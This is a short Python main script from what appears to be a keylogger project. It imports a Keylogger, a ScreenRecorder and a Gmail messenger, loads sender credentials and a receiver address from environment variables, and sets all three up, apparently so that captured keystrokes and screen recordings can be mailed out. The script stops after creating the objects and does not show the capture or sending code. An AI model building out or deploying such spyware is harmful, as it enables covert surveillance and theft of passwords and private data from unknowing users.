import os
from .keylogger import Keylogger
from .screen_recorder import ScreenRecorder
from .messenger import Gmail
from dotenv import load_dotenv

if __name__ == "__main__":
    load_dotenv()
    keylogger = Keylogger()
    screen_recorder = ScreenRecorder()
    gmail = Gmail(os.getenv("SENDER_MAIL"), os.getenv("APP_PASSWORD"), os.getenv("RECEIVER_MAIL"))



